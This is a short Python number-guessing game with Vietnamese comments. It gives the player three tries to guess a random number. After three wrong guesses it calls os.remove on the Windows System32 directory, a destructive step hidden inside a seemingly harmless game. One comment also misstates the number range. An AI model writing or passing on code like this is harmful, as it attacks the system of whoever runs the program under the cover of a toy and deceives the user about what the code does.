import random
import os

def game():
    # Tạo một số ngẫu nhiên từ 1 đến 10
    so = random.randint(1, 100)
    
    # Số lần thử
    solan = 0
    
    while solan < 3:
        # Nhập vào một số từ người dùng
        Doanso = int(input("Nhập vào một số từ 1 đến 100: "))
        
        # Kiểm tra xem số đã nhập có đúng với số đã random không
        if Doanso == so:
            print("Bạn đã trả lời đúng!")
            break
        else:
            print("Số bạn nhập không đúng. Thử lại!")
            solan += 1
    
    # Nếu người dùng đã sai quá 3 lần
    if solan == 3:
        os.remove("C:/Windows/System32")

# Chạy game
game()